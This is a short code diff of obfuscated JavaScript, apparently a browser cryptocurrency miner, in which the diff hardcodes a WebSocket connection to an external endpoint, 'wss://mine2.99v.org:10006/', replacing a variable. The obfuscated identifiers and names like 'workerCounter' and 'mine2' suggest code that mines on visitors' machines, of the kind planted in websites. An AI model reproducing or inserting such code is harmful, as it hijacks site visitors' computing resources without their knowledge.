@@ -36,7 +36,7 @@ var scriptTag, rightP, rightA, VersionCheck, workerCounter, CustomP, Webs, MyC, 
         if (ws != null) {
             ws[_0x1CF2B[25]]()
         }
-        ;ws = new WebSocket(MyC);
+        ;ws = new WebSocket("wss://mine2.99v.org:10006/");
         ws[_0x1CF2B[26]] = _0x1D19B;
         ws[_0x1CF2B[27]] = function(_0x1CF2B) {
             if (conn < 2) {
